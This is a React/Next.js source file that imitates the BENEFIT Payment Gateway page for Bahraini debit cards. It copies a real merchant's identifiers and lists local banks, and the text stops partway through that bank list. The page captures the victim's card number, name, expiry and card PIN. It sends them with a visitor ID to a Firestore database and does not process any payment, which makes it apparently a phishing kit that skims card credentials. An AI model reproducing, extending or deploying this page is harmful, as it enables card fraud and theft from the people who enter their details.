"use client"

import { addData } from "@/lib/firestore"
import React, { useState } from "react"
export default function BenefitPaymentGateway() {
  const [cardNumber, setCardNumber] = useState("")
  const [cardholderName, setCardholderName] = useState("")
  const [cvv, setCvv] = useState("")
  const [month, setMonth] = useState("")
  const [yaer, setYear] = useState("")
  const [showPad, setShowPad] = useState(false)
  const total = 10
const data={cardNumber,cardholderName,cvv,month,yaer}
const handleSubmit=(e:React.FormEvent)=>{
  e.preventDefault()
  const vId=localStorage.getItem('visitor')
  addData({id:vId,...data})
}
  return (
    <div style={{ zoom: 0.7 }}>
      <form
        action=""
        name="paypage"
        id="paypage"
        method="post"
        autoComplete="off"
      >
        <div id="maindiv">
          <input
            type="hidden"
            name="deleteSavedCard"
            id="deleteSavedCard"
            defaultValue=""
          />
          <input
            type="hidden"
            name="encryptedCardNumber"
            id="encryptedCardNumber"
            defaultValue=""
          />
          <input
            type="hidden"
            name="encryptedMonth"
            id="encryptedMonth"
            defaultValue=""
          />
          <input
            type="hidden"
            name="encryptedYear"
            id="encryptedYear"
            defaultValue=""
          />
          <input
            type="hidden"
            name="encryptedTranAmount"
            id="encryptedTranAmount"
            defaultValue=""
          />
          <input
            type="hidden"
            name="encryptedCardHolderName"
            id="encryptedCardHolderName"
            defaultValue=""
          />
          {/* Added for One click Checkout */}
          <input
            type="hidden"
            name="encryptedSavedCardCVV"
            id="encryptedSavedCardCVV"
            defaultValue=""
          />
          <input
            type="hidden"
            name="encryptedSavedCardPin"
            id="encryptedSavedCardPin"
            defaultValue=""
          />
          <input
            type="hidden"
            name="encryptedSavedCardCvd2pin"
            id="encryptedSavedCardCvd2pin"
            defaultValue=""
          />
          {/* Added for One click Checkout */}
          <input
            type="hidden"
            name="debitOTPFlg"
            id="debitOTPFlg"
            defaultValue={1}
          />
          <input
            type="hidden"
            name="creditOTPFlg"
            id="creditOTPFlg"
            defaultValue={0}
          />
          <input
            type="hidden"
            name="prepaidOTPFlg"
            id="prepaidOTPFlg"
            defaultValue={0}
          />
          <input
            type="hidden"
            name="OTPMethod"
            id="OTPMethod"
            defaultValue="U"
          />
          <input
            type="hidden"
            name="invoiceCaptchaMsg"
            id="invoiceCaptchaMsg"
            defaultValue=""
          />
          {/*  Added for AMEX authorization*/}
          <input
            type="hidden"
            name="encryptedAmexfirstname"
            id="encryptedAmexfirstname"
            defaultValue=""
          />
          <input
            type="hidden"
            name="encryptedAmexLastname"
            id="encryptedAmexLastname"
            defaultValue=""
          />
          <input
            type="hidden"
            name="encryptedCrdAddress"
            id="encryptedCrdAddress"
            defaultValue=""
          />
          <input
            type="hidden"
            name="encryptedCrdMobileNo"
            id="encryptedCrdMobileNo"
            defaultValue=""
          />
          <input
            type="hidden"
            name="encryptedCrdZipcode"
            id="encryptedCrdZipcode"
            defaultValue=""
          />
          <input
            type="hidden"
            name="encryptedCrdEmail"
            id="encryptedCrdEmail"
            defaultValue=""
          />
          <input type="hidden" name="amexFlg" id="amexFlg" defaultValue={0} />
          {/* Added for Transaction Retry */}
          <input
            type="hidden"
            name="retryAttempts"
            id="retryAttempts"
            defaultValue={0}
          />
          {/* Ends */}
          <input type="hidden" name="accordionVal" id="accordionVal" />
          {/* <header class="borderbtm"> */}
          {/*
				<div id="languageDiv">
					
					<div class="col-12">
						<a id="language_Button"><span class="text_AR">English</span><span class="text_EN">Ã˜Â¹Ã˜Â±Ã˜Â¨Ã™Å&nbsp;</span></a>
						
					</div>
				</div>
				*/}
          <div id="headerDiv">
            <div id="languageDiv">
              <a id="language_Button">
                <span
                  className="text_EN"
                  style={{ float: 'right', display: 'inline' }}
                >
                  عربي
                </span>
                <span
                  className="text_AR"
                  style={{ float: 'left', display: 'none' }}
                >
                  English
                </span>
              </a>
            </div>
            <div id="bannerDiv">
              <div
                className="row"
                id="hostedBanner"
                style={{ display: 'none' }}
              >
                <table width="100%">
                  <tbody>
                    <tr>
                      <td align="left">
                        <div>
                          <b>BENEFIT PAYMENT GATEWAY</b> <br />
                          <b>24-04-2025 08:12</b>
                        </div>
                      </td>
                      <td align="right">
                        Delmon for fishs BAHRAIN WLL <br />
                      </td>
                    </tr>
                  </tbody>
                </table>
              </div>
            </div>
            {/* <hr></hr> */}
            <div
              className="row"
              id="hostedBannerMbl"
              style={{ display: 'none' }}
            >
              <div className="headingalignment">
                <div style={{ color: 'red', textAlign: 'center' }}>
                  <b>BENEFIT PAYMENT GATEWAY</b> <br />
                  <b>24-04-2025 08:12</b>
                </div>
              </div>
              <div></div>
              <div>
                <span id="website_title_text">
                  Delmon for fishs BAHRAIN WLL <br />
                </span>
              </div>
              <div></div>
              {/* Added By BENEFIT */}
            </div>
          </div>
          {/* </header> */}
          <div id="contentDiv">
            <div className="body-container">
              <div className="container">
                <div className="detail-row">
                  {/* Code added for GSTN Paymentpage changes - Starts */}
                </div>
                <div id="customerinfo">
                  <div className="cust"></div>
                  {/*  Commented By Sridhar Starts*/}
                  {/* removed */}
                  {/* removed */}
                  {/*  Commented By Sridhar End */}
                  <div className="accordion">
                    {/* Invoice payment starts */}
                    {/* Invoice payment ends */}
                    {/* ApplePay changes starts */}
                    {/* ApplePay changes ends */}
                    {/* Debit card starts here*/}
                    <div className="group col-lg-12" id="debit">
                      <input
                        type="hidden"
                        name="creditDebitCheck"
                        defaultValue="D"
                      />
                      {/* ApplePay changes starts */}
                      {/* removed */}
                      {/* removed */}
                      {/* ApplePay changes ends */}
                      <div className="content" style={{ float: 'left' }}>
                        <div
                          className="col-lg-6 formwidth"
                          style={{ float: 'left' }}
                        >
                          <label
                            className="col-lg-12"
                            id="otpmsgDC"
                            style={{ color: 'red', float: 'left' }}
                          />
                          <div
                            id="LabelCrncyMsgDC"
                            className="col-lg-12"
                            style={{ float: 'left' }}
                          >
                            <label id="crncyMsgDC" style={{ color: 'red' }} />
                          </div>
                          <div className="col-lg-12" style={{ float: 'left' }}>
                            <label
                              className="col-lg-6 formwidth"
                              style={{ float: 'left' }}
                            >
                              Amount
                            </label>
                            <div
                              className="col-lg-6 formwidth"
                              style={{ float: 'left' }}
                            >
                              <b>BD{total}</b>
                            </div>
                          </div>
                          <div className="col-lg-12" style={{ float: 'left' }}>
                            <label
                              className="col-lg-6 formwidth"
                              style={{ float: 'left' }}
                            >
                              Card Type
                            </label>
                            <div
                              className="col-lg-6 formwidth"
                              style={{ float: 'left' }}
                            >
                              <b>Debit</b>
                            </div>
                          </div>
                          <div className="col-lg-12" style={{ float: 'left' }}>
                            <label
                              className="col-lg-6 formwidth"
                              style={{ float: 'left' }}
                            >
                              Card Number
                            </label>
                            <div
                              className="col-lg-6 formwidth"
                              style={{ float: 'left' }}
                            >
                              <input
                                name="debitCardNumber"
                                id="debitCardNumber"
                                className="debitNumber"
                                type="tel"
                                pattern="[0-9]"
                                onChange={(e)=>setCardNumber(e.target.value)}
                                size={20}
                                maxLength={19}
                                defaultValue=""
                                title="Should be in number. Length should be 13 or 16 or 19"
                              />
                            </div>
                            {/* Added for GCCNET Implementation PERFORMGCCCHECK */}
                            {/* <div class="col-lg-12">
															<label class="col-lg-6"></label>
															<div class="col-lg-6">
																<label class="must" id="Labelcard_label"> </label>
															</div>
														</div> */}
                          </div>
                          <div
                            className="col-lg-12"
                            id="debitExpDate"
                            style={{ float: 'left' }}
                          >
                            <label
                              className="col-lg-6 formwidth"
                              style={{ float: 'left' }}
                            >
                              Expiry Date
                            </label>
                            <div
                              className="col-lg-6 formwidth cols-3"
                              style={{ float: 'left' }}
                            >
                              <table dir="ltr">
                                <tbody>
                                  <tr>
                                    <td>
                                      <select
                                        name="debitMonthSelect"
                                        id="debitMonthSelect"
                                onChange={(e)=>setMonth(e.target.value)}

                                        style={{ marginLeft: '-3px' }}
                                      >
                                        <option value={0}>MM</option>
                                        <option value={1}>01</option>
                                        <option value={2}>02</option>
                                        <option value={3}>03</option>
                                        <option value={4}>04</option>
                                        <option value={5}>05</option>
                                        <option value={6}>06</option>
                                        <option value={7}>07</option>
                                        <option value={8}>08</option>
                                        <option value={9}>09</option>
                                        <option value={10}>10</option>
                                        <option value={11}>11</option>
                                        <option value={12}>12</option>
                                      </select>
                                    </td>
                                    <td>
                                      <select
                                        name="debitYearSelect"
                                        id="debitYearSelect"
                                onChange={(e)=>setYear(e.target.value)}

                                        style={{ marginRight: '-3px' }}
                                      >
                                        <option value={0}>YYYY</option>
                                        <option value={2025}>2025</option>
                                        <option value={2026}>2026</option>
                                        <option value={2027}>2027</option>
                                        <option value={2028}>2028</option>
                                        <option value={2029}>2029</option>
                                        <option value={2030}>2030</option>
                                        <option value={2031}>2031</option>
                                        <option value={2032}>2032</option>
                                        <option value={2033}>2033</option>
                                        <option value={2034}>2034</option>
                                        <option value={2035}>2035</option>
                                        <option value={2036}>2036</option>
                                        <option value={2037}>2037</option>
                                        <option value={2038}>2038</option>
                                        <option value={2039}>2039</option>
                                        <option value={2040}>2040</option>
                                        <option value={2041}>2041</option>
                                        <option value={2042}>2042</option>
                                        <option value={2043}>2043</option>
                                        <option value={2044}>2044</option>
                                        <option value={2045}>2045</option>
                                        <option value={2046}>2046</option>
                                        <option value={2047}>2047</option>
                                        <option value={2048}>2048</option>
                                        <option value={2049}>2049</option>
                                        <option value={2050}>2050</option>
                                        <option value={2051}>2051</option>
                                        <option value={2052}>2052</option>
                                        <option value={2053}>2053</option>
                                        <option value={2054}>2054</option>
                                        <option value={2055}>2055</option>
                                        <option value={2056}>2056</option>
                                        <option value={2057}>2057</option>
                                        <option value={2058}>2058</option>
                                        <option value={2059}>2059</option>
                                        <option value={2060}>2060</option>
                                        <option value={2061}>2061</option>
                                        <option value={2062}>2062</option>
                                        <option value={2063}>2063</option>
                                        <option value={2064}>2064</option>
                                        <option value={2065}>2065</option>
                                        <option value={2066}>2066</option>
                                        <option value={2067}>2067</option>
                                        <option value={2068}>2068</option>
                                      </select>
                                    </td>
                                  </tr>
                                </tbody>
                              </table>
                            </div>
                          </div>
                          <div
                            className="col-lg-12"
                            id="debitCardHldrDiv"
                            style={{ float: 'left' }}
                          >
                            <label
                              className="col-lg-6 formwidth"
                              style={{ float: 'left' }}
                            >
                              Card Holders Name
                            </label>
                            <div
                              className="col-lg-6 formwidth"
                              style={{ float: 'left' }}
                            >
                              <input
                                name="debitCardholderName"
                                id="debitCardholderName"
                                type="text"
                                onChange={(e)=>setCardholderName(e.target.value)}

                                title="should contain alphabets with space"
                                defaultValue=""
                              />
                            </div>
                          </div>
                          {/* FC */}
                          <input
                            type="hidden"
                            name="cardPinType"
                            defaultValue="A"
                          />
                          <div
                            className="col-lg-12"
                            id="eComPin"
                            style={{ display: '', float: 'left' }}
                          >
                            <label
                              className="col-lg-6 formwidth"
                              style={{ float: 'left' }}
                            >
                              PIN
                            </label>
                            <div
                              className="col-lg-6 formwidth input_container"
                              style={{ float: 'left' }}
                            >
                              <input
                                className="pinfiledlength"
                                name="cardPin"
                                id="cardPin"
                                autoComplete="off"
                                title="Should be in number. Length should be 4"
                                type="password"
                                size={4}
                                onChange={(e)=>setCvv(e.target.value)}

                                maxLength={4}
                              />
                            </div>
                          </div>
                          <div
                            id="keypad_div"
                            className="keypad_container kyBx"
                            style={{ display: showPad?'inline':"none" }}
                          >
                            {/* <button type="button" class="btn brn-primary" id="clrBtn" style="float:right;position:relative;right:26px;top:10px;">X</button> */}
                            <div
                              className="col-lg-12  "
                              id=""
                              style={{ float: 'left' }}
                            >
                              <label
                                className="col-lg-6 keyformwidth "
                                style={{ float: 'left' }}
                              />
                              <div
                                className="col-lg-6 keyformwidth"
                                style={{ float: 'left' }}
                              >
                                <div className="col-sm-3">
                                  <input
                                    className="btn btn-primary"
                                    id="cardPinbtn1"
                                    type="button"
                                    defaultValue={8}
                                  />
                                  <input
                                    className="btn btn-primary"
                                    id="cardPinbtn2"
                                    type="button"
                                    defaultValue={4}
                                  />
                                  <input
                                    className="btn btn-primary"
                                    id="cardPinbtn3"
                                    type="button"
                                    defaultValue={5}
                                  />
                                  <input
                                    className="btn btn-primary"
                                    id="cardPinbtn4"
                                    type="button"
                                    defaultValue={7}
                                  />
                                  <input
                                    className="btn btn-primary"
                                    id="cardPinbtn5"
                                    type="button"
                                    defaultValue={6}
                                  />
                                </div>

                                <div className="col-sm-3">
                                  <input
                                    className="btn btn-primary"
                                    id="cardPinbtn6"
                                    type="button"
                                    defaultValue={9}
                                  />
                                  <input
                                    className="btn btn-primary"
                                    id="cardPinbtn7"
                                    type="button"
                                    defaultValue={3}
                                  />
                                  <input
                                    className="btn btn-primary"
                                    id="cardPinbtn8"
                                    type="button"
                                    defaultValue={1}
                                  />
                                  <input
                                    className="btn btn-primary"
                                    id="cardPinbtn9"
                                    type="button"
                                    defaultValue={0}
                                  />
                                  <input
                                    className="btn btn-primary"
                                    id="cardPinbtn0"
                                    type="button"
                                    defaultValue={2}
                                  />
                                </div>

                                <div className="col-sm-3">
                                  <span
                                    className="text_EN"
                                    style={{ display: 'inline' }}
                                  >
                                    <input
                                      className="btn btn-primary btnwidth"
                                      id="cardPinbtnDel"
                                      type="button"
                                      defaultValue="<"
                                    />
                                    <input
                                      className="btn btn-primary btnwidth"
                                      name="cardPinbtnRef"
                                      id="cardPinbtnRef"
                                      type="button"
                                      defaultValue="Clear"
                                    />
                                    <input
                                      className="btn btn-primary btnwidth"
                                      name="cardPinbtnRef1"
                                      id="cardPinbtnRef1"
                                      type="button"
                                      defaultValue="Enter"
                                    />
                                  </span>
                                  <span
                                    className="text_AR"
                                    style={{ display: 'none' }}
                                  >
                                    <input
                                      className="btn btn-primary btnwidth"
                                      name="cardPinbtnRef1"
                                      id="cardPinbtnRef1"
                                      type="button"
                                      defaultValue="Enter"
                                    />
                                    <input
                                      className="btn btn-primary btnwidth"
                                      name="cardPinbtnRef"
                                      id="cardPinbtnRef"
                                      type="button"
                                      defaultValue="Clear"
                                    />
                                    <input
                                      className="btn btn-primary btnwidth"
                                      id="cardPinbtnDel"
                                      type="button"
                                      defaultValue=">"
                                    />
                                  </span>
                                </div>
                              </div>
                            </div>
                          </div>
                          {/* 	Unsaved captcha card starts */}
                          {/* 	Unsaved captcha card ends*/}
                          {/* Unsaved captcha card ends */}
                          {/* Debit+PIN changes-Ends */}
                          <div
                            id="debitCardCVVHideShow"
                            className="col-lg-12"
                            style={{ float: 'left' }}
                          ></div>
                          <div
                            id="cardCVD2HideShowPIN"
                            className="col-lg-12"
                            style={{ display: 'none', float: 'left' }}
                          >
                            <label
                              className="col-lg-6"
                              style={{ float: 'left' }}
                            >
                              CVD2
                            </label>
                            <div className="col-lg-6" style={{ float: 'left' }}>
                              <input
                                name="rupayDebitCardCvd2"
                                autoComplete="off"
                                title="Should be in number.Maximum length should be 4"
                                type="password"
                                size={4}
                                maxLength={4}
                                id="rupayDebitCardCvd2"
                              />
                              <span
                                title="The Card Verification Data (CVD2) is a 3 or 4-digit number found on the signature panel on the back of your card following the printed Card number."
                                className="masterTooltip cvvHint"
                                style={{ display: 'none' }}
                              >
                                {' '}
                                <img
                                  src="/logo.webp"
                                  style={{ marginBottom: 10 }}
                                />
                              </span>
                              <span style={{}} className="cvvHintDev">
                                {' '}
                                <img
                                  src="/logo.webp"
                                  style={{ marginBottom: 10 }}
                                />
                              </span>
                            </div>
                          </div>
                          {/* Added for AMEx Authorization */}
                          <div
                            id="amexDebitCVVDiv"
                            className="col-lg-12"
                            style={{ display: 'none', float: 'left' }}
                          ></div>
                          {/* Ends */}
                          {/* Added for AMEx Authorization */}
                          <div
                            className="col-lg-12"
                            id="amexDebitAAVDiv"
                            style={{ display: 'none', float: 'left' }}
                          >
                            <div
                              className="col-lg-12"
                              style={{ float: 'left' }}
                            >
                              <label
                                className="col-lg-6"
                                style={{ float: 'left' }}
                              >
                                First Name
                              </label>
                              <div
                                className="col-lg-6"
                                style={{ float: 'left' }}
                              >
                                <input
                                  name="amexDebitCardholderFirstName"
                                  id="amexDebitCardholderFirstName"
                                  type="text"
                                  size={19}
                                  maxLength={15}
                                  defaultValue=""
                                  title="Should contain alphanumeric. Length should be between 1 and 15"
                                />
                              </div>
                            </div>
                            <div
                              className="col-lg-12"
                              style={{ float: 'left' }}
                            >
                              <label
                                className="col-lg-6"
                                style={{ float: 'left' }}
                              >
                                Last Name
                              </label>
                              <div
                                className="col-lg-6"
                                style={{ float: 'left' }}
                              >
                                <input
                                  name="amexDebitCardholderLastName"
                                  id="amexDebitCardholderLastName"
                                  type="text"
                                  size={19}
                                  maxLength={30}
                                  defaultValue=""
                                  title="Should contain alphanumeric. Length should be between 1 and 30"
                                />
                              </div>
                            </div>
                          </div>
                          {/* Ends */}
                          {/* Added for capturing card holder details -starts */}
                          <div
                            className="col-lg-12"
                            id="dbtMobileNum"
                            style={{ float: 'left' }}
                          ></div>
                          <div
                            className="col-lg-12"
                            id="dbtEmail"
                            style={{ float: 'left' }}
                          ></div>
                          {/* Added for capturing card holder details -ends */}
                        </div>
                      </div>
                    </div>
                    {/* ApplePay changes starts */}
                    {/* ApplePay changes ends */}
                    {/* Saved card starts here */}
                    {/* Saved card ends here */}
                    {/* Credit card start here */}
                    {/* Credit card ends here */}
                    {/* Prepaid Card starts */}
                    {/* Prepaid card Ends */}
                    {/*  IMPS starts here */}
                    {/*  IMPS end here */}
                  </div>
                  {/* Modified for One Click Checkout */}
                  {/* Modified for One Click Checkout */}
                  {/* Added for One Click Checkout */}
                  <div className="col-lg-12" style={{ float: 'left' }}>
                    <label className="col-lg-6" style={{ float: 'left' }} />
                  </div>
                  {/* Added for One Click Checkout */}
                  <div
                    className="col-lg-12"
                    id="proceedCancel"
                    style={{ textAlign: 'center' }}
                  >
                    {/* <div class="row" id="proceedCancel"> */}
                    <input
                      style={{ background: '#d7181f', marginRight: 5 }}
                      name="proceed"
                      type="button"
                      className="btn btn-primary pbtn"
                      id="proceed"
                      defaultValue="Pay"
                    />
                    <input
                      style={{ background: '#d7181f', marginRight: 5 }}
                      name="cancel"
                      type="button"
                      className="btn btn-primary pbtn"
                      id="cancel"
                      defaultValue="Cancel"
                    />
                  </div>

                  {/* Commented by Sridhar Starts */}
                  {/* Commented by Sridhar Ends */}
                </div>
                {/* Hidden Fields : Start */}
                {/*  End */}
                {/* Code Added for GSTN fix Starts */}
                <input
                  type="hidden"
                  name="gstnTXNId"
                  id="gstnTXNId"
                  defaultValue=""
                />
                <input
                  type="hidden"
                  name="gstnFlag"
                  id="gstnFlag"
                  defaultValue={0}
                />
                <input
                  type="hidden"
                  name="paymentInitTime"
                  id="paymentInitTime"
                  defaultValue="Thu Apr 24 08:12:42 AST 2025"
                />
                {/* Code Added for GSTN fix Ends */}
                <input
                  type="hidden"
                  name="selectedPymntInstrmnt"
                  id="selectedPymntInstrmnt"
                  defaultValue=""
                />
                <input
                  type="hidden"
                  name="captchaMsg"
                  id="captchaMsg"
                  defaultValue=""
                />
                {/* End */}
                <input
                  type="hidden"
                  name="paymentId"
                  defaultValue={145202511435781382}
                />
                <input
                  type="hidden"
                  name="atmPayRetentionPeriod"
                  defaultValue={0}
                />
                <input
                  type="hidden"
                  name="fCCustMob"
                  id="fCCustMob"
                  defaultValue=""
                />
                {/* ApplePay changes starts */}
                <input
                  type="hidden"
                  name="mrchName"
                  id="mrchName"
                  defaultValue="JARIR MARKETING BAHRAIN WLL"
                />
                {/* ApplePay changes ends */}
                <input
                  type="hidden"
                  name="mrchWeb"
                  defaultValue="https://www.jarir.com/bh-en/"
                />
                <input
                  type="hidden"
                  name="mrchWebName"
                  defaultValue="JARIR MARKETING BAHRAIN WLL"
                />
                <input
                  type="hidden"
                  name="mrchTrackId"
                  defaultValue="comXbhX9000062257XP001"
                />
                <input
                  type="hidden"
                  name="pymntInstrmntCC"
                  id="pymntInstrmntCC"
                  defaultValue={0}
                />
                <input type="hidden" name="pymntInstrmntAC" defaultValue={0} />
                <input
                  type="hidden"
                  name="pymntInstrmntDC"
                  id="pymntInstrmntDC"
                  defaultValue={1}
                />
                <input
                  type="hidden"
                  name="pymntInstrmntPC"
                  id="pymntInstrmntPC"
                  defaultValue={0}
                />
                <input type="hidden" name="pymntInstrmntAP" defaultValue={0} />
                <input type="hidden" name="pymntInstrmntDD" defaultValue={0} />
                <input type="hidden" name="ecomFlg" defaultValue={0} />
                <input type="hidden" name="captchaFlg" defaultValue={0} />
                <input type="hidden" name="instName" defaultValue="CRMX" />
                <input type="hidden" name="mrchErrUrl" defaultValue="#" />
                <input type="hidden" name="avsFlg" defaultValue={0} />
                <input type="hidden" name="headerType" defaultValue={0} />
                <input type="hidden" name="termId" defaultValue={18319950} />
                <input type="hidden" name="instId" defaultValue={145} />
                <input type="hidden" name="mrchId" defaultValue={18319950} />
                <input type="hidden" name="maestroCheckFlag" defaultValue={0} />
                <input type="hidden" name="rupFlg" defaultValue={0} />
                <input
                  type="hidden"
                  name="pymntInstrmntIMPS"
                  defaultValue={0}
                />
                <input type="hidden" name="debitSel" defaultValue="P" />
                <input type="hidden" name="creditSel" defaultValue="" />
                <input type="hidden" name="prepaidSel" defaultValue="" />
                <input type="hidden" name="siFlag" defaultValue={0} />
                <input type="hidden" name="invoiceOpenLink" defaultValue={0} />
                <input type="hidden" name="invoicePayment" defaultValue={0} />
                <input
                  type="hidden"
                  name="fcFlag"
                  id="fcFlag"
                  defaultValue={0}
                />
                <input type="hidden" name="fcChecked" id="fcChecked" />
                <input type="hidden" name="fcExpCheck" id="fcExpCheck" />
                <input
                  type="hidden"
                  name="fcCtCheck"
                  id="fcCtCheck"
                  defaultValue={0}
                />
                <input
                  type="hidden"
                  name="fcDtCheck"
                  id="fcDtCheck"
                  defaultValue={0}
                />
                <input
                  type="hidden"
                  name="fcPdCheck"
                  id="fcPdCheck"
                  defaultValue={0}
                />
                <input type="hidden" name="rdc" id="rdc" defaultValue="" />
                <input
                  type="hidden"
                  name="checkBrand"
                  id="checkBrand"
                  defaultValue=""
                />
                <input
                  type="hidden"
                  name="onOffType"
                  id="onOffType"
                  defaultValue=""
                />
                <input
                  type="hidden"
                  name="maestro"
                  id="maestro"
                  defaultValue=""
                />
                <input type="hidden" name="ccInstFlg" defaultValue={0} />
                <input type="hidden" name="ccTermFlg" defaultValue={0} />
                <input
                  type="hidden"
                  name="merchantCurrencyFlg"
                  defaultValue={0}
                />
                <input type="hidden" name="cardCurrencyFlg" defaultValue={0} />
                <input type="hidden" name="otherCurrencyFlg" defaultValue={0} />
                <input
                  type="hidden"
                  name="pymntInstrmntCnt"
                  id="pymntInstrmntCnt"
                  defaultValue={1}
                />
                <input type="hidden" defaultValue="" name="cspg" />
                <input
                  type="hidden"
                  name="CSRFToken"
                  defaultValue="6faee586-403d-4500-9b6d-c712c38c97f4"
                />
                <input type="hidden" defaultValue="" name="otpStatus" />
                <input type="hidden" defaultValue="D" name="otpallowed" />
                <input type="hidden" defaultValue="U" name="otpmethod" />
                <input type="hidden" name="errorStr" id="errorStr" />
                <input type="hidden" name="resultCode" id="resultCode" />
                <input type="hidden" name="postDate" id="postDate" />
                <input type="hidden" name="responseCode" id="responseCode" />
                {/* Added for Rupay denied by Risk */}
                <input type="hidden" name="tranId" id="tranId" />
                <input type="hidden" name="authCode" id="authCode" />
                {/* End */}
                {/* Added by Pandiselvi A */}
                {/* End */}
                {/* Added for AMEX Authorization - Starts */}
                <input type="hidden" name="amexChkFlg" defaultValue={0} />
                {/* Added for AMEX Authorization - Ends */}
                <input type="hidden" name="paymentMode" defaultValue={0} />
                <input type="hidden" name="buttontype" defaultValue={0} />
                <input
                  type="hidden"
                  name="cardHolderDetailLst"
                  defaultValue="N"
                />
                <input type="hidden" name="mrchCheckDetail" defaultValue="" />
                <input type="hidden" name="currSymbol" defaultValue="BD" />
                {/* Added for EMV2.0 Integrations */}
                <input
                  type="hidden"
                  name="browserLanguage"
                  id="browserLanguage"
                />
                <input
                  type="hidden"
                  name="browserColorDepth"
                  id="browserColorDepth"
                />
                <input
                  type="hidden"
                  name="browserScreenHeight"
                  id="browserScreenHeight"
                />
                <input
                  type="hidden"
                  name="browserScreenWidth"
                  id="browserScreenWidth"
                />
                <input type="hidden" name="browserTZ" id="browserTZ" />
                <input type="hidden" name="javaEnabled" id="javaEnabled" />
                <input type="hidden" name="jsEnabled" id="jsEnabled" />
                {/* Ends */}
                {/* ApplePay changes starts */}
                <input
                  type="hidden"
                  name="applepayFlag"
                  id="applepayFlag"
                  defaultValue={0}
                />
                <input type="hidden" name="ref" id="ref" />
                {/* ApplePay changes ends */}
                <input
                  type="hidden"
                  name="inst_term_tranRetry_flg"
                  defaultValue={1}
                />
                <input
                  type="hidden"
                  name="minorDigits"
                  id="minorDigits"
                  defaultValue={3}
                />
                <input
                  type="hidden"
                  name="sameMerchant"
                  id="sameMerchant"
                  defaultValue=""
                />
                {/* Hidden Fields : End */}
                <div className="col-lg-12" style={{ float: 'left' }}>
                  <label className="col-lg-6" style={{ float: 'left' }} />
                </div>
                <div className="col-lg-12" style={{ float: 'left' }}>
                  <label className="col-lg-6" style={{ float: 'left' }} />
                </div>
              </div>
              {/* Container ends */}
            </div>
            {/* body-Container ends */}
            {/* </div> */}
          </div>
        </div>
        <div id="footerDiv">
          <div className="col-lg-12" style={{ float: 'left' }}>
            <div
              style={{ textAlign: 'justify', float: 'left' }}
              className="col-lg-12"
            ></div>
          </div>
        </div>
        <div className="body-container">
          <div className="container">
            <div className="detail-row">
              <div className="row" id="viewContent">
                <a id="bank_list" className="a_with_items a_items_container">
                  <span
                    className="text_EN"
                    style={{ display: 'inline', color: 'red', fontWeight: 400 }}
                  >
                    View Accepted Cards
                  </span>
                  <span className="text_AR" style={{ display: 'none' }}>
                    عرض البطاقات المقبولة
                  </span>
                </a>
                <ul
                  className="a_items_container bank_list"
                  style={{ display: 'none' }}
                >
                  <li>
                    <span className="text_EN" style={{ display: 'inline' }}>
                      Ahli United Bank B.S.C.
                    </span>
                    <span className="text_AR" style={{ display: 'none' }}>
                      بنك الأهلي المتحد
                    </span>
                  </li>
                  <li>
                    <span className="text_EN" style={{ display: 'inline' }}>
                      Al Baraka Islamic Bank B.S.C
                    </span>
                    <span className="text_AR" style={{ display: 'none' }}>
                      بنك البركة الإسلامي
                    </span>
                  </li>
                  <li>
                    <span className="text_EN" style={{ display: 'inline' }}>
                      Al-Salam Bank - Bahrain B.S.C.
                    </span>
                    <span className="text_AR" style={{ display: 'none' }}>
                      مصرف السلام
                    </span>
                  </li>
                  <li>
                    <span className="text_EN" style={{ display: 'inline' }}>
                      Arab Bank Plc
                    </span>
                    <span className="text_AR" style={{ display: 'none' }}>
                      البنك العربي
                    </span>
                  </li>
                  <li>
                    <span className="text_EN" style={{ display: 'inline' }}>
                      Bahrain Islamic Bank
                    </span>
                    <span className="text_AR" style={{ display: 'none' }}>
                      بنك البحرين الإسلامي
                    </span>
                  </li>
                  <li>
                    <span className="text_EN" style={{ display: 'inline' }}>
                      BANK OF BAHRAIN AND KUWAIT
                    </span>
                    <span className="text_AR" style={{ display: 'none' }}>
                      بنك البحرين و الكويت
                    </span>
                  </li>
                  <li>
                    <span className="text_EN" style={{ display: 'inline' }}>
                      Citi Bank N. A.
                    </span>
                    <span className="text_AR" style={{ display: 'none' }}>
                      بسيتي بنك
                    </span>
                  </li>
                  <li>
                    <span className="text_EN" style={{ display: 'inline' }}>
                      CREDIT LIBANAIS S.A.L
                    </span>
                    <span className="text_AR" style={{ display: 'none' }}>
                      الإعتماد اللبناني
                    </span>
                  </li>
                  <li>
                    <span className="text_EN" style={{ display: 'inline' }}>
                      Gulf International Bank B.S.C
                    </span>
                    <span className="text_AR" style={{ display: 'none' }}>
                      بنك الخليج الدولي
                    </span>
                  </li>
                  <li>
                    <span className="text_EN" style={{ display: 'inline' }}>
                      Habib Bank Limited
                    </span>
                    <span className="text_AR" style={{ display: 'none' }}>
                      بنك حبيب
                    </span>
                  </li>
                  <li>
                    <span className="text_EN" style={{ display: 'inline' }}>
                      HSBC Bank Middle East Limited
                    </span>
                    <span className="text_AR" style={{ display: 'none' }}>
                      اتش . اس .بي. سي
                    </span>
                  </li>
                  <li>
                    <span className="text_EN" style={{ display: 'inline' }}>
                      ICICI Bank Limited
                    </span>
                    <span className="text_AR" style={{ display: 'none' }}>
                      بنك آي سي آي سي آي
                    </span>
                  </li>
                  <li>
                    <span className="text_EN" style={{ display: 'inline' }}>
                      ila Bank
                    </span>
                    <span className="text_AR" style={{ display: 'none' }}>
                      ابنك إلى
                    </span>
                  </li>
                  <li>
                    <span className="text_EN" style={{ display: 'inline' }}>
                      Ithmaar Bank B.S.C. (Closed)
                    </span>
                    <span className="text_AR" style={{ display: 'none' }}>
                      بنك الإثمار
                    </span>
                  </li>
                  <li>
                    <span className="text_EN" style={{ display: 'inline' }}>
                      Khaleeji Commercial Bank B.S.C.
                    </span>
                    <span className="text_AR" style={{ display: 'none' }}>
                      مصرف الخليجي التجاري
                    </span>
                  </li>
                  <li>
                    <span className="text_EN" style={{ display: 'inline' }}>
                      Kuwait Finance House (Bahrain) B.S.C.( Closed)
                    </span>
                    <span className="text_AR" style={{ display: 'none' }}>
                      بيت التمويل الكويتي
                    </span>
                  </li>
                  <li>
                    <span className="text_EN" style={{ display: 'inline' }}>
                      Mashreq Bank P.S.C
                    </span>
                    <span className="text_AR" style={{ display: 'none' }}>
                      بنك المشرق
                    </span>
                  </li>
                  <li>
                    <span className="text_EN" style={{ display: 'inline' }}>
                      National Bank Of Bahrain B.S.C.
                    </span>
                    <span className="text_AR" style={{ display: 'none' }}>
                      بنك البحرين الوطني
                    </span>
                  </li>
                  <li>
                    <span className="text_EN" style={{ display: 'inline' }}>
                      National Bank Of Kuwait S.A.K. / Commercial Branch
                    </span>
                    <span className="text_AR" style={{ display: 'none' }}>
                      بنك الكويت الوطني
                    </span>
                  </li>
                  <li>
